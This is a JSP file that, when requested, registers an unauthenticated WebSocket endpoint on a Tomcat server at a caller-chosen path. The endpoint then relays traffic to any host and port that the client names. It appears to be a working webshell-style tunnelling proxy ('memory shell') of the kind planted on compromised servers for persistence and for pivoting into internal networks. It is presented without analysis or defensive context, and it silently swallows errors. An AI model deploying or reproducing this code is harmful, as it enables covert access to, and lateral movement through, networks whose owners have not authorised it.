<%@ page import="javax.websocket.server.ServerEndpointConfig" %>
<%@ page import="javax.websocket.server.ServerContainer" %>
<%@ page import="javax.websocket.*" %>
<%@ page import="java.io.*" %>
<%@ page import="java.util.concurrent.locks.ReentrantLock" %>
<%@ page import="java.nio.channels.AsynchronousSocketChannel" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.nio.ByteBuffer" %>
<%@ page import="java.nio.channels.CompletionHandler" %>
<%@ page import="java.net.InetSocketAddress" %>
<%@ page import="java.util.concurrent.TimeUnit" %>
<%@ page import="java.util.concurrent.Future" %>
<%@ page import="org.apache.tomcat.websocket.server.WsServerContainer" %>
<%!
    public static class ProxyEndpoint extends Endpoint {
        long i =0;
        int counter =0;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ReentrantLock lock = new ReentrantLock();
        HashMap<String,AsynchronousSocketChannel> map = new HashMap<String,AsynchronousSocketChannel>();
        static class Attach {
            public AsynchronousSocketChannel client;
            public Session channel;
        }
        void readFromServer(Session channel,AsynchronousSocketChannel client){
            final ByteBuffer buffer = ByteBuffer.allocate(50000);
            Attach attach = new Attach();
            attach.client = client;
            attach.channel = channel;
            client.read(buffer, attach, new CompletionHandler<Integer, Attach>() {
                @Override
                public void completed(Integer result, final Attach scAttachment) {
                    counter++;
                    buffer.clear();
                    try {
                        if(buffer.hasRemaining() && result>=0)
                        {
                            byte[] arr = new byte[result];
                            ByteBuffer b = buffer.get(arr,0,result);
                            baos.write(arr,0,result);
                            ByteBuffer q = ByteBuffer.wrap(baos.toByteArray());
                            if (scAttachment.channel.isOpen()) {
                                scAttachment.channel.getBasicRemote().sendBinary(q);
                            }
                            baos = new ByteArrayOutputStream();
                            readFromServer(scAttachment.channel,scAttachment.client);
                        }else{
                            if(result > 0)
                            {
                                byte[] arr = new byte[result];
                                ByteBuffer b = buffer.get(arr,0,result);
                                baos.write(arr,0,result);
                                readFromServer(scAttachment.channel,scAttachment.client);
                            }
                        }
                    } catch (Exception ignored) {}
                }
                @Override
                public void failed(Throwable t, Attach scAttachment) {t.printStackTrace();}
            });
        }
        void writeToServer(final ByteBuffer z,Session channel, AsynchronousSocketChannel client){
            client.write(z, z, new CompletionHandler<Integer, ByteBuffer>() {
                @Override
                public void completed(Integer result, ByteBuffer attach) {z.flip();}
                @Override
                public void failed(Throwable t, ByteBuffer asy) {}
            });
        }
        void process(ByteBuffer z,Session channel)
        {
            lock.lock();
            try{
                if(i>1)
                {
                    AsynchronousSocketChannel client = map.get(channel.getId());
                    writeToServer(z,channel,client);
                }
                else if(i==1)
                {
                    String values = new String(z.array());
                    String[] array = values.split(" ");
                    String[] addrarray = array[1].split(":");
                    AsynchronousSocketChannel client = AsynchronousSocketChannel.open();
                    int po = Integer.parseInt(addrarray[1]);
                    InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po);
                    Future<Void> future = client.connect(hostAddress);
                    future.get(10, TimeUnit.SECONDS);
                    map.put(channel.getId(), client);
                    readFromServer(channel,client);
                    channel.getBasicRemote().sendText("HTTP/1.1 200 Connection Established\r\n\r\n");
                }
            }catch(Exception e){
                try {
                    channel.getBasicRemote().sendText("HTTP/1.1 503 Service Unavailable\r\n\r\n");
                } catch (Exception ignored) {}
            }finally{
                lock.unlock();
            }
        }
        @Override
        public void onOpen(final Session session, EndpointConfig config) {
            i=0;
            session.addMessageHandler(new MessageHandler.Whole<ByteBuffer>() {
                @Override
                public void onMessage(ByteBuffer message) {
                    try {
                        message.clear();
                        i++;
                        process(message,session);
                    } catch (Exception ignored) {
                    }
                }
            });
        }
    }
%>
<%
    String path = request.getParameter("path");
    ServletContext servletContext = request.getSession().getServletContext();
    ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(ProxyEndpoint.class, path).build();
    WsServerContainer container = (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());
    try {
        if (null == container.findMapping(path)) {
            container.addEndpoint(configEndpoint);
        }
    } catch (DeploymentException e) {
        out.println(e.toString());
    }
%>
